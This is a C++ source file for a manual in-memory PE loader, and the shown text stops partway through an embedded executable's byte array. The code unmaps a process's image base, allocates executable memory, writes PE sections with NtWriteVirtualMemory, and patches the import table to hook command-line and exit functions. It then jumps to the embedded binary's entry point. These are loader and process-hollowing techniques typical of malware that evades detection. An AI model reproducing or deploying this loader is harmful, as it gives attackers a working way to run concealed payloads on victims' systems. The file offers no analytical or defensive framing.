#include "Header.h"

NTSTATUS status;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Wide = NULL;
wchar_t* sz_masqCmd_ArgvWide[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;

LPWSTR hookGetCommandLineW() { return sz_masqCmd_Wide; }
LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }

char*** __cdecl hook__p___argv(void)
{
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    return 0;
}

int __cdecl hookexit(int status)
{
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    ExitThread(0);
}

// Define a custom exception class
class PEException : public std::runtime_error {
public:
    explicit PEException(const std::string& message)
        : std::runtime_error(message) {}
};

void MasqueradeCmdline(const char* cmdLine)
{
    // Copy cmdline into global variable
    free(sz_masqCmd_Ansi); // Free the memory if it was previously allocated
    sz_masqCmd_Ansi = _strdup(cmdLine); // Use strdup to allocate and copy

    // Convert cmdline to widestring
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    free(sz_masqCmd_Wide); // Free the memory if it was previously allocated
    sz_masqCmd_Wide = (wchar_t*)calloc(required_size, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Wide, required_size);

    // Create widestring array of pointers
    LocalFree(poi_masqArgvW); // Free the memory if it was previously allocated
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Wide, &int_masqCmd_Argc);

    // Manual function equivalent for CommandLineToArgvA
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    LocalFree(poi_masqArgvA); // Free the memory if it was previously allocated
    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }
}

char* GetNTHeaders(char* pe_buffer) {
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id) {
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

void RepairIAT(PVOID modulePtr) {
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) throw std::runtime_error("GetPEDirectory returned NULL");

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true) {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                if (!addr) throw std::runtime_error("GetProcAddress returned NULL");
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {
                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);

                LPSTR func_name = (LPSTR)by_name->Name;
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
                if (!addr) throw std::runtime_error("GetProcAddress returned NULL");

                if (_stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (_stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (_stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (_stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (_stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (_stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (_stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if ((_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (_stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else
                    fieldThunk->u1.Function = addr;
            }

            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    // Function completes successfully, nothing to return since it's void
}

void LoadPE(HANDLE cProc, char* data, const long long datasize) {
    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) {
        chksum = data[i] * i + chksum / 3;
    };

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;

    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        throw PEException("NT Headers not found");
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

    NtUnmapViewOfSection(cProc, (PVOID)ntHeader->OptionalHeader.ImageBase);

    SIZE_T RegionSize = (SIZE_T)ntHeader->OptionalHeader.SizeOfImage;
    NTSTATUS status = NtAllocateVirtualMemory(cProc, &preferAddr, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        throw PEException("Allocating memory failed with status: " + std::to_string(status));
    }
    pImageBase = (BYTE*)preferAddr;
    if (!pImageBase) {
        if (!relocDir) {
            throw PEException("Unable to allocate memory and no relocation directory present");
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase) {
                throw PEException("VirtualAlloc failed");
            }
        }
    }

    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    SIZE_T HeaderSize = (SIZE_T)ntHeader->OptionalHeader.SizeOfHeaders;
    status = NtWriteVirtualMemory(cProc, pImageBase, data, HeaderSize, NULL);
    if (!NT_SUCCESS(status)) {
        throw PEException("Writing headers to memory failed with status: " + std::to_string(status));
    }

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)((size_t)ntHeader + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        SIZE_T DataSize = (SIZE_T)SectionHeaderArr[i].SizeOfRawData;
        status = NtWriteVirtualMemory(cProc, (LPVOID)((size_t)pImageBase + SectionHeaderArr[i].VirtualAddress), (LPVOID)((size_t)data + SectionHeaderArr[i].PointerToRawData), DataSize, NULL);
        if (!NT_SUCCESS(status)) {
            throw PEException("Writing section " + std::to_string(i) + " to memory failed with status: " + std::to_string(status));
        }
    }

    RepairIAT(pImageBase);

    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    InvokeImage(retAddr);
}

int main(int argc, char** argv) {
    std::vector<unsigned char> pebuf = { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x0F, 0xAA, 0xAD, 0x20, 0x6E, 0xC4, 0xFE, 0x20, 0x6E, 0xC4, 0xFE, 0x20, 0x6E, 0xC4, 0xFE, 0x29, 0x16, 0x57, 0xFE, 0x2A, 0x6E, 0xC4, 0xFE, 0x35, 0x11, 0xC5, 0xFF, 0x23, 0x6E, 0xC4, 0xFE, 0x35, 0x11, 0xC1, 0xFF, 0x32, 0x6E, 0xC4, 0xFE, 0x35, 0x11, 0xC0, 0xFF, 0x2A, 0x6E, 0xC4, 0xFE, 0x35, 0x11, 0xC7, 0xFF, 0x23, 0x6E, 0xC4, 0xFE, 0xF3, 0x1C, 0xC5, 0xFF, 0x22, 0x6E, 0xC4, 0xFE, 0x20, 0x6E, 0xC5, 0xFE, 0x12, 0x6E, 0xC4, 0xFE, 0x16, 0xEE, 0xCD, 0xFF, 0x21, 0x6E, 0xC4, 0xFE, 0x16, 0xEE, 0x3B, 0xFE, 0x21, 0x6E, 0xC4, 0xFE, 0x16, 0xEE, 0xC6, 0xFF, 0x21, 0x6E, 0xC4, 0xFE, 0x52, 0x69, 0x63, 0x68, 0x20, 0x6E, 0xC4, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00, 0x49, 0x60, 0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x0E, 0x25, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x13, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x60, 0x81, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x29, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x8C, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0xF0, 0x23, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x22, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xA0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0xEC, 0x0D, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0xB0, 0x0F, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x38, 0x06, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x8C, 0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x19, 0x26, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x89, 0x54, 0x24, 0x10, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x53, 0x56, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xF9, 0x48, 0x8D, 0x74, 0x24, 0x58, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x42, 0x11, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0xE8, 0xBA, 0xFF, 0xFF, 0xFF, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD3, 0x48, 0x8B, 0x08, 0xFF, 0x15, 0x1B, 0x11, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xFA, 0x8B, 0xF1, 0x83, 0xF9, 0x01, 0x7E, 0x49, 0x48, 0x8D, 0x0D, 0xC5, 0x11, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x30, 0xE8, 0x7B, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC7, 0x08, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x66, 0x90, 0x4C, 0x8B, 0x07, 0x48, 0x8D, 0x0D, 0xC6, 0x11, 0x00, 0x00, 0x8B, 0xD3, 0xE8, 0x5F, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x48, 0x8D, 0x7F, 0x08, 0x3B, 0xDE, 0x7C, 0xE5, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8D, 0x0D, 0xB4, 0x11, 0x00, 0x00, 0xE8, 0x37, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x3B, 0x0D, 0x01, 0x1F, 0x00, 0x00, 0x75, 0x10, 0x48, 0xC1, 0xC1, 0x10, 0x66, 0xF7, 0xC1, 0xFF, 0xFF, 0x75, 0x01, 0xC3, 0x48, 0xC1, 0xC9, 0x10, 0xE9, 0xAA, 0x02, 0x00, 0x00, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xE8, 0xBE, 0x0B, 0x00, 0x00, 0xE8, 0xE3, 0x06, 0x00, 0x00, 0x8B, 0xC8, 0xE8, 0xE8, 0x0B, 0x00, 0x00, 0xE8, 0xCB, 0x06, 0x00, 0x00, 0x8B, 0xD8, 0xE8, 0x0C, 0x0C, 0x00, 0x00, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x89, 0x18, 0xE8, 0x44, 0x04, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x73, 0xE8, 0x37, 0x09, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x6C, 0x09, 0x00, 0x00, 0xE8, 0xDF, 0x05, 0x00, 0x00, 0xE8, 0xA2, 0x06, 0x00, 0x00, 0x8B, 0xC8, 0xE8, 0x85, 0x0B, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x52, 0xE8, 0xA2, 0x06, 0x00, 0x00, 0xE8, 0xD9, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x8D, 0x0D, 0x7E, 0x06, 0x00, 0x00, 0xE8, 0x61, 0x0B, 0x00, 0x00, 0xE8, 0x9C, 0x06, 0x00, 0x00, 0xE8, 0x97, 0x06, 0x00, 0x00, 0xE8, 0x6A, 0x06, 0x00, 0x00, 0x8B, 0xC8, 0xE8, 0x9F, 0x0B, 0x00, 0x00, 0xE8, 0x82, 0x06, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x05, 0xE8, 0x49, 0x0B, 0x00, 0x00, 0xE8, 0x50, 0x06, 0x00, 0x00, 0xE8, 0x0B, 0x08, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x06, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0xAB, 0x06, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x5F, 0x06, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x37, 0x08, 0x00, 0x00, 0xE8, 0x16, 0x06, 0x00, 0x00, 0x8B, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0xE9, 0x4D, 0x0B, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x30, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x2F, 0x03, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x36, 0x01, 0x00, 0x00, 0x40, 0x32, 0xF6, 0x40, 0x88, 0x74, 0x24, 0x20, 0xE8, 0xDE, 0x02, 0x00, 0x00, 0x8A, 0xD8, 0x8B, 0x0D, 0x76, 0x23, 0x00, 0x00, 0x83, 0xF9, 0x01, 0x0F, 0x84, 0x23, 0x01, 0x00, 0x00, 0x85, 0xC9, 0x75, 0x4A, 0xC7, 0x05, 0x5F, 0x23, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB0, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x91, 0x0F, 0x00, 0x00, 0xE8, 0xAE, 0x0A, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0A, 0xB8, 0xFF, 0x00, 0x00, 0x00, 0xE9, 0xD9, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x6F, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x58, 0x0F, 0x00, 0x00, 0xE8, 0x87, 0x0A, 0x00, 0x00, 0xC7, 0x05, 0x21, 0x23, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x08, 0x40, 0xB6, 0x01, 0x40, 0x88, 0x74, 0x24, 0x20, 0x8A, 0xCB, 0xE8, 0x1C, 0x04, 0x00, 0x00, 0xE8, 0xC3, 0x05, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x83, 0x38, 0x00, 0x74, 0x1E, 0x48, 0x8B, 0xC8, 0xE8, 0x6E, 0x03, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x12, 0x45, 0x33, 0xC0, 0x41, 0x8D, 0x50, 0x02, 0x33, 0xC9, 0x48, 0x8B, 0x03, 0xFF, 0x15, 0xE4, 0x0E, 0x00, 0x00, 0xE8, 0x9F, 0x05, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x83, 0x38, 0x00, 0x74, 0x14, 0x48, 0x8B, 0xC8, 0xE8, 0x42, 0x03, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x08, 0x48, 0x8B, 0x0B, 0xE8, 0x54, 0x0A, 0x00, 0x00, 0xE8, 0x13, 0x0A, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0xE8, 0x35, 0x0A, 0x00, 0x00, 0x48, 0x8B, 0x18, 0xE8, 0x27, 0x0A, 0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD3, 0x8B, 0x08, 0xE8, 0x60, 0xFD, 0xFF, 0xFF, 0x8B, 0xD8, 0xE8, 0xBD, 0x06, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x55, 0x40, 0x84, 0xF6, 0x75, 0x05, 0xE8, 0x11, 0x0A, 0x00, 0x00, 0x33, 0xD2, 0xB1, 0x01, 0xE8, 0xB2, 